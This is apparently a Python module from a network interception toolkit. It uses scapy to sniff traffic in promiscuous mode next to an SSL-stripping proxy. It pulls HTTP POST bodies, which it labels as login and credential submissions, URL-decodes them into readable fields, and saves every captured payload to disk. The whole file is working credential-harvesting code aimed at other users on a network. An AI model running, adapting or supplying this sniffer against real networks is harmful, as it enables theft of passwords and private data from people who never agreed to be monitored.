import scapy.all as scapy
import uuid
import time
import hashlib
import re
from . import STATUS, STOP_EVENT, CAPTURE_DIR
from .utils import log_msg, set_promiscuous_mode

# Cache to prevent logging duplicate packets within a short window
recent_packets = {}

def parse_packet_data(payload):
    """ Classifies packet payload to determine alert level and description. """
    title = "RAW DATA"
    description = payload[:100] 
    alert_type = "INFO"

    # Priority 1: POST Requests (Login Forms / Credential Submission)
    if "POST " in payload:
        title = "CAPTURED DATA"
        alert_type = "ALERT" 
        

        try:
            if '\r\n\r\n' in payload:
                _, body = payload.split('\r\n\r\n', 1)
                if body:
                    import urllib.parse
                    description = urllib.parse.unquote(body).replace('&', '\n')
                else:
                    description = "Empty POST Body"
        except:
            description = "Form data detected"

    # Priority 2: GET Requests (Standard Page Loads)
    elif payload.startswith("GET"):
        title = "PAGE REQUEST"
        alert_type = "INFO"
        try:
            description = payload.split('\r\n')[0] # Extract URL line
        except:
            description = "Page load detected"

    # Priority 3: Server Responses
    elif payload.startswith("HTTP/"):
        title = "SERVER RESPONSE"
        alert_type = "WARNING"
        try:
            description = payload.split('\r\n')[0]
        except:
            description = "Server status"

    return title, description, alert_type

def packet_callback(packet):
    if STOP_EVENT.is_set(): return
    
    # Process only TCP packets containing Raw payload data
    if packet.haslayer(scapy.Raw) and packet.haslayer(scapy.TCP):
        try:
            payload = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
            
            # Filter out own traffic (SSL Strip Proxy on port 10000)
            if packet[scapy.TCP].sport == 10000 or packet[scapy.TCP].dport == 10000:
                return 

            # Deduplication: MD5 hash payload to check if we saw this recently
            payload_hash = hashlib.md5(payload.encode()).hexdigest()
            current_time = time.time()
            if payload_hash in recent_packets:
                if current_time - recent_packets[payload_hash] < 2.0:
                    return 
            recent_packets[payload_hash] = current_time

            # Capture Logic: Look for HTTP verbs
            is_interesting = "POST " in payload or "GET " in payload or "HTTP/" in payload
            
            if is_interesting:
                title, desc, type_class = parse_packet_data(payload)

                timestamp_id = time.strftime('%H%M%S')
                clean_src = packet[scapy.IP].src.replace('.', '-')
                pkt_id = f"{timestamp_id}_{clean_src}"
                src = packet[scapy.IP].src
                
                # Save raw payload to disk for full inspection later
                with open(f"{CAPTURE_DIR}/{pkt_id}.html", "w", encoding="utf-8") as f: 
                    f.write(payload)
                
                data_entry = {
                    "id": pkt_id, 
                    "time": time.strftime('%H:%M:%S'),
                    "src": src, 
                    "dst": packet[scapy.IP].dst,
                    "title": title,         
                    "snippet": desc,        
                    "type": type_class
                }
                
                STATUS["intercepted_data"].append(data_entry)
                STATUS["all_intercepted_data"].append(data_entry) 
                
                # Only print high-priority alerts to the console to reduce noise
                if type_class == "ALERT":
                    log_msg(f"[{title}] from {src}")

        except: pass

def start_sniffer():
    interface = STATUS["interface"]
    set_promiscuous_mode(interface, True)
    try:
        # Start Scapy sniff loop without storing packets in memory (store=0)
        scapy.sniff(iface=interface, store=0, prn=packet_callback, stop_filter=lambda p: STOP_EVENT.is_set())
    except Exception as e:
        log_msg(f"[!] Sniffer Error: {e}")
    finally:
        set_promiscuous_mode(interface, False)